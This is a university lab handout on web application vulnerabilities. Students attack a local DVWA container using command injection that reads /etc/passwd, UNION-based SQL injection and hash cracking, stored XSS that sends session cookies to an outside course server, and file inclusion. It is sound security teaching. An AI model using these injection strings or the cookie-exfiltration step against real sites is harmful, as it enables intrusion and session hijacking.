# Computer Security, ac. year 2023./2024.
# 3rd lab excersise: Web application vulnerabilities

## IP address

To perform the third lab exercise. Normally everything works by default, but if you cannot connect to the machine over the network, try changing the virtual machine's network adapter type (bridged or NAT should work). You also need to be connected to the Internet on the host computer!

Log in to the virtual machine and check the assigned IP addresses:
```
$ ip addr
...
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
...
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.19.0.136/24 brd 10.19.0.255 scope global dynamic noprefixroute enp0s8
...
4: enp0s9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 192.168.56.101/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s9
```
In the example shown, the NAT interface is assigned the address 10.0.2.15, the address of the  "bridged" interface is 10.19.0.136 and the address of the "host-only" interface is 192.168.56.101.
In this exercise, you will connect from your host computer to a vulnerable web server at virtual machine's "bridged" or "host-ony" address.

## Docker

Start a docker instance of a vulnerable web server.
 
* If you are using a VirtualBox to run the IMUNES-Ubuntu _image_ (Windows / Linux / macOS Intel) call:
```
$ sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
* If you are using UTM to run the IMUNES-Ubuntu (macOS Apple Silicon M1/M2) call:  
```
$ sudo docker run --rm -it -p 80:80 dvwa
```

## Connecting to a vulnerable web server

Connect to a vulnerable web server from your host computer using a "bridged" or "host-ony" address:
```
http://_address_/
```
The login credentials are:
```
u: admin
p: password
```
Click on the button at the bottom of the page: `Create / Reset Database` and open the same page again:
```
http://_address_/
```
In this exercise, you will study web application vulnerabilities (Commmand Execution, SQL injection, XSS and File inclusion). The goal is to exploit vulnerabilities so you know how to test and protect a web application in the future.


**NOTE:** NOTE: When performing the exercise, feel free to use the options hidden behind the `View Source` and `View Help` buttons in the lower-left corner of each window.

## 1) Command Injection

- Open `Command Injection`

- Try command: `1 | echo SRS`

- If the form has printed `SRS`, continue - if not, make sure that the `dvwa low security level` is set in the DVWA Security menu.

- Furthermore, you can type any command after the initial `1 |`. Separate multiple commands with a character `&`. Examples: `1 | ls`, `1 | pwd & whoami & ps`...

- It is necessary to print the contents of the file `/etc/passwd` and attach it in the solution of the task with the described procedure and the commands used.

## 2) SQL injection

- Open `SQL Injection`.

- Try basic examples according to course lectures.

- The goal is to retrieve password hash for the user “pablo picasso”. To get it, you need to know the structure and name of the table in which the user data is stored. Although this can be achieved by typing a series of SQL statements into the form under `SQL injection`, for simplicity you can look at how the table looks directly in the database:
```
    mysql> show columns from users;
    +------------+-------------+------+-----+---------+-------+
    | Field      | Type        | Null | Key | Default | Extra |
    +------------+-------------+------+-----+---------+-------+
    | user_id    | int(6)      | NO   | PRI | 0       |       |
    | first_name | varchar(15) | YES  |     | NULL    |       |
    | last_name  | varchar(15) | YES  |     | NULL    |       |
    | user       | varchar(15) | YES  |     | NULL    |       |
    | password   | varchar(32) | YES  |     | NULL    |       |
    | avatar     | varchar(70) | YES  |     | NULL    |       |
    +------------+-------------+------+-----+---------+-------+
```

- Save the password hash retrieved by the `SQL injection` attack into a file on a virtual machine. Example for user `admin`:
```
$ echo "21232f297a57a5a743894a0e4a801fc3" > hashes.txt
```

The password hash is calculated with MD5.

You can perform "password cracking" using some free online service. (You can also install and use the program "John the Ripper")

- It is necessary to specify all the commands that you have inserted and describe the whole process. The final solution to the task is the password of the user Pablo Picasso. (Hint: Use the `UNION` keyword in queries)

## 3) XSS (Cross Site Scripting)

- Open `XSS Stored` window. Here it is possible to enter scripts in the `Message` section, which are then stored in the database, i.e. in the `guestbook` table.

- Try to enter simple javascript code - by reloading the page, the script should be executed automatically (e.g. javascript command `alert()`).

- Read the cookies of the user that is viewing the site using the javascript command `alert()`. Specify the VALUE of the `PHPSESSID` variable in the report in one line of the following format:
```
PHPSESSID=f04m0i20nek10volimtep6e9irji5
```

- All cookies should be submitted using the `GET` request as a parameter on:\
  `http://mrepro.tel.fer.hr/srs`\
Add the parameter `jmbag` which coresponds to your students number.\
For example:\
`http://mrepro.tel.fer.hr/srs?cookie=security=low;%20PHPSESSID=f04m0i20nek10volimtep6e9irji5&jmbag=0012345678`\
\
  Describe the whole process and attach the scripts used.

- How would you protect your app from vulnerabilities like this?

## 4) File inclusion

- Open the File Inclusion window and follow the instructions (it is possible to change the HTTP `GET` parametar `page`)

- Print the `/etc/passwd` file, attach a screenshot with the printed file, and explain why it is possible to do this.

- How would you protect this app from this type of attack?

## Results of laboratory exercise

As a result of the laboratory exercise, through the Moodle system you need to submit a **ZIP archive** containing a report file **report.txt** in txt format (maximum 1500 words) with a task solving process and answers to questions and a **screenshot** from task 4.

